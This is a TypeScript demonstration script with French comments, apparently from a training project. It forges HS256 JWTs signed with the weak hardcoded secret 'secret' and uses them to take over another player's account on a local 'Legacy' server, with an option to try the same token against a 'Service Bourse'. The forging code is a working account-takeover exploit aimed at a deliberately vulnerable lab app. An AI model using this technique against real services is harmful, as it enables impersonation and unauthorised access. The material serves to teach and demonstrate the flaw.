// Démonstration : forger un jeton valide pour le Legacy en connaissant son secret, « secret ».
// Usage : npm run forger (le Legacy doit tourner : npm run legacy dans un autre terminal).
//         npm run forger -- --pas-a-pas    une pause (Entrée) entre chaque étape, pour la projeter
//         npm run forger -- --bourse [URL] le même genre de jeton contre le Service Bourse (http://127.0.0.1:3100 par défaut)
// Code retour : 0 si le jeton forgé est accepté, 1 s'il est refusé, 2 en cas d'erreur.
import { createHmac } from "node:crypto";
import { createInterface } from "node:readline/promises";
import { chargerEnvironnement } from "./environnement.ts";

chargerEnvironnement();
const args = process.argv.slice(2);
const pasAPas = args.includes("--pas-a-pas");
const indexBourse = args.indexOf("--bourse");
const URL_LEGACY = process.env.CIBLE_URL ?? `http://127.0.0.1:${process.env.PORT ?? 3000}`;
const URL_BOURSE = (indexBourse >= 0 && args[indexBourse + 1]?.startsWith("http") ? args[indexBourse + 1] : undefined) ??
  process.env.CIBLE_URL ?? `http://127.0.0.1:${process.env.BOURSE_PORT ?? 3100}`;

async function appeler(base: string, methode: string, chemin: string, corps?: unknown, jeton?: string) {
  const reponse = await fetch(base + chemin, {
    method: methode,
    headers: { ...(corps === undefined ? {} : { "content-type": "application/json" }), ...(jeton ? { authorization: `Bearer ${jeton}` } : {}) },
    body: corps === undefined ? undefined : JSON.stringify(corps),
  });
  const texte = await reponse.text();
  let json: any = null;
  try {
    json = JSON.parse(texte);
  } catch {
    // corps non JSON
  }
  return { statut: reponse.status, json };
}

// Un JWT, c'est trois morceaux en base64url séparés par des points : en-tête, charge utile, signature.
// La signature est un HMAC-SHA256 des deux premiers, avec le secret. Rien d'autre.
const base64url = (o: unknown) => Buffer.from(JSON.stringify(o)).toString("base64url");
function forger(charge: Record<string, unknown>, secret: string) {
  const entete = base64url({ alg: "HS256", typ: "JWT" });
  const corps = base64url(charge);
  return `${entete}.${corps}.${createHmac("sha256", secret).update(`${entete}.${corps}`).digest("base64url")}`;
}
const lire = (morceau: string) => JSON.parse(Buffer.from(morceau, "base64url").toString());

const clavier = pasAPas ? createInterface({ input: process.stdin, output: process.stdout }) : undefined;
async function etape(titre: string) {
  if (clavier) await clavier.question(`\n[Entrée] ${titre}`);
  else console.log(`\n${titre}`);
}

async function contreLeLegacy(): Promise<boolean> {
  await etape("1. Je me connecte comme rivet, avec son mot de passe, et je lis mon jeton.");
  const connexion = await appeler(URL_LEGACY, "POST", "/connexion", { pseudo: "rivet", motDePasse: "ferraille" });
  if (connexion.statut !== 200) throw new Error(`connexion de rivet refusée (HTTP ${connexion.statut}) : le Legacy tourne-t-il sur ${URL_LEGACY} ?`);
  const [entete, charge, signature] = (connexion.json.jeton as string).split(".");
  console.log(`   en-tête          ${JSON.stringify(lire(entete))}`);
  console.log(`   charge utile     ${JSON.stringify(lire(charge))}   (lisible par tous : base64, pas chiffré ; aucun exp)`);
  console.log(`   signature        ${signature.slice(0, 16)}...`);

  await etape("2. Je cherche l'identifiant de zephyr : il est public, dans le détail de ses Annonces.");
  const liste = await appeler(URL_LEGACY, "GET", "/annonces");
  const sienne = (liste.json as Array<{ id: number; vendeur: string }>).find((a) => a.vendeur === "zephyr");
  if (!sienne) throw new Error("aucune Annonce de zephyr : rechargez les données (npm run reinitialiser)");
  const detail = await appeler(URL_LEGACY, "GET", `/annonces/${sienne.id}`);
  const id = detail.json.vendeur_id;
  console.log(`   GET /annonces/${sienne.id} -> vendeur_id: ${id}`);

  await etape("3. Je forge un jeton pour zephyr, signé avec « secret », le secret écrit dans legacy/src/serveur.ts.");
  const forge = forger({ sub: id, pseudo: "zephyr" }, "secret");
  console.log(`   ${forge}`);

  await etape("4. J'ouvre le compte de zephyr avec ce jeton, sans son mot de passe.");
  const moi = await appeler(URL_LEGACY, "GET", "/moi", undefined, forge);
  console.log(`   GET /moi -> HTTP ${moi.statut} ${JSON.stringify(moi.json)}`);
  const accepte = moi.statut === 200 && moi.json?.pseudo === "zephyr";
  console.log(
    accepte
      ? "\nJeton forgé accepté : quiconque lit le secret devient n'importe quel Joueur, pour toujours (pas d'exp)."
      : "\nJeton forgé refusé.",
  );
  return accepte;
}

async function contreLeServiceBourse(): Promise<boolean> {
  await etape(`Je forge un jeton pour zephyr, signé avec « secret », et je l'envoie au Service Bourse (${URL_BOURSE}).`);
  const forge = forger({ sub: "zephyr", exp: Math.floor(Date.now() / 1000) + 3600 }, "secret");
  const reponse = await appeler(URL_BOURSE, "POST", "/annonces", { objetId: "o-pile-zephyr", prix: 1 }, forge);
  console.log(`   POST /annonces -> HTTP ${reponse.statut} ${JSON.stringify(reponse.json)}`);
  const accepte = reponse.statut !== 401;
  console.log(accepte ? "\nJeton forgé accepté par le Service Bourse." : "\nJeton forgé refusé : le Service Bourse ne signe pas avec « secret ».");
  return accepte;
}

try {
  const accepte = indexBourse >= 0 ? await contreLeServiceBourse() : await contreLeLegacy();
  clavier?.close();
  process.exit(accepte ? 0 : 1);
} catch (e) {
  console.error(`Démonstration impossible : ${(e as Error).message}`);
  process.exit(2);
}
